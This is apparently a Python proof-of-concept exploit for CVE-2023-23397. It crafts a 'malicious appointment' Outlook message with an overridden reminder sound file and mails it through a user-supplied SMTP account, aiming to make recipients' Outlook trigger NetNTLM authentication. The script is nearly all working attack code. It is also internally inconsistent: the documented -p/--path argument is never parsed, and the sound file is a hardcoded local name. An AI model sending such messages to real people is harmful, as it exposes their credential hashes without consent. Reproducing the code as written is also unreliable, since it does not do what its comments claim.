import smtplib
import getpass
import datetime
import argparse
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from email.utils import COMMASPACE, formatdate
from independentsoft.msg import Message
"""
Asks the user for the SMTP server, port, sender email and password, and recipient email.
smtp_server (str): The SMTP server to use for sending the email.
smtp_port (int): The port to use for the SMTP server.
sender_email (str): The email address of the sender.
sender_password (str): The password for the sender's email account.
recipients_email (list): A list of email addresses of the recipients.
"""
smtp_server = input("SMTP Server: ")
smtp_port = int(input("SMTP Port: "))
sender_email = input("Sender Email: ")
sender_password = getpass.getpass(prompt="Sender Password: ")
recipients_email = [input("Recipient Email: ")]


class Email:
    def __init__(self, smtp_server, port, username, password, recipient):
        """
        Initializes an Email object.
        smtp_server (str): The SMTP server to use for sending the email.
        port (int): The port to use for the SMTP server.
        username (str): The email address of the sender.
        password (str): The password for the sender's email account.
        recipient (list): A list of email addresses of the recipients.
        """
        self.smtp_server = smtp_server
        self.port = port
        self.username = username
        self.password = password
        self.recipient = recipient

    def send(self, subject, body, attachment_path):
        """
        Sends an email with a subject, body, and attachment to the recipient(s).
        subject (str): The subject of the email.
        body (str): The body of the email.
        attachment_path (str): The path of the attachment to be included in the email.
        """
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = COMMASPACE.join(self.recipient)
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject
        msg.attach(MIMEText(body))

        with open(attachment_path, 'rb') as f:
            part = MIMEApplication(f.read(), Name=attachment_path)
            part['Content-Disposition'] = f'attachment; filename="{attachment_path}"'
            msg.attach(part)

        try:
            server = smtplib.SMTP(self.smtp_server, self.port)
            server.starttls()
            server.login(self.username, self.password)
            server.sendmail(self.username, self.recipient, msg.as_string())
            server.quit()
            print("[+] Malicious appointment sent !")
        except Exception as e:
            print("[-] Error with SMTP server...", e)


"""
This code creates and sends a malicious appointment email using the specified credentials and email addresses. It takes a required command line argument -p/--path, which specifies the local path of a sound file to use as a reminder in the appointment. 
The appointment details (subject, body, location, start and end times, etc.) are hardcoded into the appointment object. The appointment is saved as an Outlook message file named "appointment.msg".
The email is sent using the `send()` method of the `Email` class, which takes the appointment file as an attachment and sends it to the specified recipients. 
Note: This code is a proof-of-concept (POC) for CVE-2023-23397, a vulnerability that allows attackers to trigger NetNTLM authentication via a malicious appointment email.
"""

appointment = Message()
appointment.message_class = "IPM.Appointment"
appointment.subject = "CVE-2023-23397"
appointment.body = "0-Zer0 Click Vulnerability"
appointment.location = "SAUDI"
appointment.appointment_start_time = datetime.datetime.now()
appointment.appointment_end_time = datetime.datetime.now()
appointment.reminder_override_default = True
appointment.reminder_sound_file = 'chicken.wav'
appointment.save("appointment.msg")

email = Email(smtp_server, smtp_port, sender_email,
              sender_password, recipients_email)

subject = "CVE-2023-23397"
body = "0-Zer0 Click Vulnerability"
email.send(subject, body, "appointment.msg")
